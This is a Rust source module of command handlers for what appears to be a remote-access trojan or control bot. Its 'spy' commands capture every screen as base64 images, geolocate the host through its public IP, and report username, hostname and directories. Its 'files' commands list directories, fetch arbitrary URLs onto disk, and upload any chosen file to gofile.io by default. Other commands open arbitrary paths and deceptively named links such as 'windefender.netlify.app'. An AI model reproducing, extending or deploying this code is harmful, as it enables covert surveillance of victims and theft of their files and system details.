#[allow(unused)]
use crate::core::{ Args, OutFun, Output, Text, Media };

pub use rand::Rng;

#[allow(unused)]
use crate::data;

#[cfg(any(feature = "troll", feature = "control"))]
pub use open;
#[cfg(feature = "troll")]
use base64::decode;
#[cfg(feature = "troll")]
use rodio::{ OutputStream, source::Source };

#[cfg(feature = "spy")]
use serde::Deserialize;
#[cfg(feature = "spy")]
use reqwest::blocking::get;
#[cfg(feature = "spy")]
use screenshots::{ Screen, image };
#[cfg(feature = "spy")]
use std::io::Cursor;
#[cfg(feature = "spy")]
use base64::encode;
#[cfg(feature = "spy")]
use whoami;
#[cfg(feature = "spy")]
use std::env;

#[cfg(feature = "files")]
use std::io::Read;
#[cfg(feature = "files")]
use std::fs::File;
#[cfg(feature = "files")]
use std::io::Write;

#[macro_use]
pub mod helpers {
    #[macro_export]
    macro_rules! text_output {
        ($out:ident, $text:expr) => {
        $out(Output::Text(Text { data: $text.to_string() }))
        };
    }

    #[macro_export]
    macro_rules! media_output {
        ($out:ident, $name:expr, $data:expr) => {
        $out(Output::Media(Media { name: $name.to_string(), data: $data.to_string() }))
        };
    }
}

pub fn ping(_args: Args, out: OutFun) {
    text_output!(out, "Pong!");
}

pub fn quit(args: Args, out: OutFun) {
    if args.len() < 1 {
        text_output!(out, "Place 'ohyes' as an argument to quit");
    } else if args[0] != "ohyes" {
        text_output!(out, "Place 'ohyes' as an argument bro");
    } else {
        text_output!(out, "Exiting...");
        std::process::exit(0);
    }
}

#[cfg(feature = "troll")]
pub fn rickroll(_args: Args, out: OutFun) {
    let rickrolls: Vec<String> = vec![
        // We need more rickrolls
        "https://windefender.netlify.app".to_string(),
        "https://openbrowser.netlify.app".to_string()
    ];
    let rindex = rand::thread_rng().gen_range(0..rickrolls.len());
    let url = &rickrolls[rindex];
    if let Err(err) = open::that(url) {
        text_output!(out, format!("ERROR opening url: {}", err));
    }
    text_output!(out, format!("Opened url: {}", url));
}

#[cfg(feature = "troll")]
pub fn fart(_args: Args, out: OutFun) {
    let audio_bytes = match decode(data::FART) {
        Ok(bytes) => bytes,
        Err(err) => {
            text_output!(out, format!("Error decoding base64 data: {}", err));
            return;
        }
    };
    text_output!(out, "Farting...");
    let (_stream, stream_handle) = OutputStream::try_default().unwrap();

    let source = rodio::Decoder::new(std::io::Cursor::new(audio_bytes)).unwrap();

    match stream_handle.play_raw(source.convert_samples()) {
        Ok(_) => {}
        Err(err) => {
            text_output!(out, format!("Error playing audio: {}", err));
            return;
        }
    }

    std::thread::sleep(std::time::Duration::from_secs(1));
    text_output!(out, "Farted!");
}

#[cfg(feature = "spy")]
pub fn location(_args: Args, out: OutFun) {
    use crate::utils;

    text_output!(out, "Getting public IP address");

    let ip_address = match utils::get_public_ip() {
        Ok(ip) => ip,
        Err(err) => {
            text_output!(out, format!("Error getting public IP address: {}", err));
            return;
        }
    };

    let url = format!("http://ip-api.com/json/{}", ip_address);

    text_output!(out, format!("Sending request to {}", url));

    #[derive(Debug, Deserialize)]
    struct Geolocation {
        lat: f64,
        lon: f64,
    }

    let response = match get(&url) {
        Ok(response) => response,
        Err(err) => {
            text_output!(out, format!("{:?}", err));
            return;
        }
    };
    let geolocation: Geolocation = match response.json() {
        Ok(data) => data,
        Err(err) => {
            text_output!(out, format!("Error parsing JSON: {:?}", err));
            return;
        }
    };

    text_output!(
        out,
        format!(
            "Latitude: {}\nLongitude: {}\nCOORDS: {}, {}",
            geolocation.lat,
            geolocation.lon,
            geolocation.lat,
            geolocation.lon
        )
    );
}

#[cfg(feature = "spy")]
pub fn screenshot(_args: Args, out: OutFun) {
    let screens = match Screen::all() {
        Ok(screens) => screens,
        Err(err) => {
            text_output!(out, format!("Error getting screens: {}", err));
            return;
        }
    };
    for screen in screens {
        let image = match screen.capture() {
            Ok(image) => { image }
            Err(err) => {
                text_output!(out, format!("Error capturing screenshot: {}", err));
                return;
            }
        };
        let mut buffer = Vec::new();
        let mut cursor = Cursor::new(&mut buffer);

        // Write the image data to the buffer
        match image.write_to(&mut cursor, image::ImageOutputFormat::Png) {
            Ok(_) => {
                let base64_data = encode(&buffer);
                text_output!(out, "Outputting screenshot");
                media_output!(out, "screenshot.png", base64_data);
            }
            Err(err) => {
                text_output!(out, format!("Error writing to buffer: {}", err));
            }
        }
    }
}

#[cfg(feature = "spy")]
pub fn sys(_args: Args, out: OutFun) {
    text_output!(out, "Getting info");
    let username = whoami::username();
    let hostname = whoami::hostname();
    let home_dir: String = match env::var("HOME") {
        Ok(dir) => dir,
        Err(err) => {
            text_output!(out, format!("Error while getting home dir: {:?}", err));
            "N/A".to_string()
        }
    };
    let current_dir: String = match env::current_dir() {
        Ok(dir) => if let Some(path) = dir.to_str() {
            path.to_string()
        } else {
            text_output!(out, "Error: Couldn't decode directory");
            "N/A".to_string()
        }
        Err(err) => {
            text_output!(out, format!("Error while getting current dir: {}", err));
            "N/A".to_string()
        }
    };

    let info = format!(
        "Username: {}\nHostname: {}\nHome Directory: {}\nCurrent Directory: {}",
        username,
        hostname,
        home_dir,
        current_dir
    );
    text_output!(out, info);
}

#[cfg(feature = "files")]
pub fn download(args: Args, out: OutFun) {
    if args.len() < 2 {
        text_output!(out, format!("Please provide a url and target path to download to."));
        return;
    }

    let download_url = &args[0];
    let download_path = &args[1];

    // Perform the actual download using reqwest
    let response = reqwest::blocking::get(download_url);

    match response {
        Ok(mut file) => {
            let mut buffer = Vec::new();
            match file.read_to_end(&mut buffer) {
                Ok(_) => {}
                Err(err) => {
                    text_output!(out, format!("Error reading download buffer: {}", err));
                }
            }

            // Write the downloaded content to the specified path
            let mut output_file = match File::create(download_path) {
                Ok(file) => file,
                Err(err) => {
                    text_output!(out, format!("Error creating file: {}", err));
                    return;
                }
            };
            match output_file.write_all(&buffer) {
                Ok(_) => {}
                Err(err) => {
                    text_output!(out, format!("Error writing to {}: {}", download_path, err));
                    return;
                }
            }

            text_output!(out, "Download complete!");
        }
        Err(err) => {
            text_output!(out, format!("Error downloading file: {}", err));
        }
    }
}

#[cfg(feature = "files")]
pub fn upload(args: Args, out: OutFun) {
    if args.len() < 1 {
        text_output!(out, "Please provide a file path to upload.");
        return;
    }

    let url: String;
    let argname: String;

    if args.len() > 2 {
        let cloned_args = args.clone();
        url = cloned_args[1].clone();
        argname = cloned_args[2].clone();
    } else {
        url = "https://store1.gofile.io/uploadFile".to_string();
        argname = "file".to_string();
    }

    let file_path = &args[0];

    text_output!(out, format!("Uploading file {} to {} within feild {}", file_path, url, argname));

    let form = match reqwest::blocking::multipart::Form::new().file(argname, file_path) {
        Ok(form) => form,
        Err(err) => {
            text_output!(out, format!("Error while creating form: {}", err));
            return;
        }
    };

    let response = match reqwest::blocking::Client::new().post(&url).multipart(form).send() {
        Ok(res) => res,
        Err(err) => {
            text_output!(out, format!("Error getting response from {}: {}", &url, err));
            return;
        }
    };

    if response.status().is_success() {
        let restext = match response.text() {
            Ok(text) => text,
            Err(err) => {
                text_output!(out, format!("Error parsing response: {}", err));
                return;
            }
        };
        text_output!(out, format!("File uploaded successfully to: {}", restext));
    } else {
        text_output!(out, format!("File upload failed with status: {:?}", response.status()));
    }
}

#[cfg(feature = "files")]
pub fn ls(args: Args, out: OutFun) {
    let dir;
    if args.len() < 1 {
        dir = match std::env::current_dir() {
            Ok(b) => {
                match b.to_str() {
                    Some(s) => s.to_string(),
                    _ => {
                        text_output!(out, format!("Couldn't convert pathbuf to string"));
                        return;
                    }
                }
            }
            Err(err) => {
                text_output!(out, format!("Unable to get current directory {:?}", err));
                return;
            }
        };
    } else {
        dir = args[0].clone();
    }

    let entries = std::fs::read_dir(&dir);
    match entries {
        Ok(rentries) => {
            let mut style_text = String::new();
            for entry in rentries {
                if let Ok(entry) = entry {
                    let file_name = entry.file_name();
                    style_text += format!("{:?}\n", file_name).as_str();
                }
            }
            text_output!(out, format!("Listing directory {}:\n{}", dir, style_text))
        }
        Err(err) => {
            text_output!(out, format!("Error while reading entries: {}", err));
        }
    }
}

#[cfg(feature = "control")]
pub fn opencmd(args: Args, out: OutFun) {
    if args.len() < 1 {
        text_output!(out, "Please provide a path/url to open");
        return;
    }
    let path = &args[0];
    if let Err(err) = open::that(path) {
        text_output!(out, format!("ERROR opening {}: {}", path, err));
        return;
    }
    text_output!(out, format!("Opened path: {}", path));
}
